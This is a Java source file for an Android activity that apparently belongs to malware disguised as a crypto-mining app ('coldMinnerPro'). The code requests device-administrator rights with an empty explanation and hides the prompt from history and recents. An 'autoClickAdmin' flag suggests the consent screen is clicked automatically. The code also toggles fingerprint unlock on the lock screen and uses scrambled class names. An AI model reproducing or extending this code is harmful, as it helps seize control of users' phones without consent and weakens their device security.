package com.crypto.coldMinnerPro;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import com.crypto.coldMinnerPro.receivers.AdminReceiverzxc;
import com.crypto.coldMinnerPro.utils.SharedPrefManager;

public class ActivityAdminqw extends Activity {

    private static final String TAG = "ActivityAdminqw";
    private ComponentName mAdminComponent;
    private SharedPrefManager prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            mAdminComponent = new ComponentName(this, AdminReceiverzxc.class);
            prefs = new SharedPrefManager(this);

            if (isAdminActive(this)) {
                finish();
                return;
            } else {
                promptForAdminActivation();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during onCreate: ", e);
            Toast.makeText(this, "An error occurred during initialization.", Toast.LENGTH_SHORT).show();
            finish();
        }
    }

    public void setFingerprintDisabled(int userId) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            if (dpm == null) {
                Log.e(TAG, "DevicePolicyManager is null");
                return;
            }

            if (mAdminComponent == null) {
                mAdminComponent = new ComponentName(this, AdminReceiverzxc.class);
            }
            int status = dpm.getKeyguardDisabledFeatures(mAdminComponent);

            if (dpm.isAdminActive(mAdminComponent)) {
                if ((status & DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT) != 0) {
                    dpm.setKeyguardDisabledFeatures(mAdminComponent, status & ~DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT);
                } else {
                    dpm.setKeyguardDisabledFeatures(mAdminComponent, status | DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT);
                }
            }
        } catch (SecurityException se) {
            Log.e(TAG, "SecurityException in setFingerprintDisabled: ", se);
            Toast.makeText(this, "Permission denied. Unable to disable fingerprint.", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Log.e(TAG, "Error in setFingerprintDisabled: ", e);
            Toast.makeText(this, "An error occurred while disabling fingerprint.", Toast.LENGTH_SHORT).show();
        }
    }

    private void promptForAdminActivation() {
        try {
            prefs.setB("autoClickAdmin", true);
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "");
            //intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            startActivityForResult(intent, 1);
        } catch (Exception e) {
            Log.e(TAG, "Error in promptForAdminActivation: ", e);
            Toast.makeText(this, "An error occurred while prompting for admin activation.", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        try {
            if (requestCode == 1) {
                if (isAdminActive(this)) {
                    prefs.setB("autoClickAdmin", false);
                   // Toast.makeText(this, "Admin is Activated!", Toast.LENGTH_SHORT).show();
                    finish();
                } else {
                    prefs.setB("autoClickAdmin", false);
                  //  Toast.makeText(this, "Failed to activate admin!", Toast.LENGTH_SHORT).show();
                    finish();
                }
            }
        } catch (Exception e) {
            finish();
            Log.e(TAG, "Error in onActivityResult: ", e);
            Toast.makeText(this, "An error occurred while processing admin activation result.", Toast.LENGTH_SHORT).show();
        }
    }

    public static boolean isAdminActive(Context context) {
        try {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (devicePolicyManager == null) {
                Log.e(TAG, "DevicePolicyManager is null");
                return false;
            }
            ComponentName adminComponent = new ComponentName(context, AdminReceiverzxc.class);
            return devicePolicyManager.isAdminActive(adminComponent);
        } catch (Exception e) {
            Log.e(TAG, "Error in isAdminActive: ", e);
            return false;
        }
    }

    public static void removeSelfAdmin(Context context) {
        try {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(context, AdminReceiverzxc.class);

            if (devicePolicyManager == null) {
                Log.e(TAG, "DevicePolicyManager is null");
                return;
            }

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.removeActiveAdmin(adminComponent);
                Log.i(TAG, "Device admin has been removed.");
                Toast.makeText(context, "Device admin has been removed.", Toast.LENGTH_SHORT).show();
            } else {
                Log.i(TAG, "Device admin is not active. No action needed.");
                Toast.makeText(context, "Device admin is not active. No action needed.", Toast.LENGTH_SHORT).show();
            }
        } catch (SecurityException se) {
            Log.e(TAG, "SecurityException in removeSelfAdmin: ", se);
            Toast.makeText(context, "Permission denied. Unable to remove admin.", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Log.e(TAG, "Error in removeSelfAdmin: ", e);
            Toast.makeText(context, "An error occurred while removing device admin.", Toast.LENGTH_SHORT).show();
        }
    }
}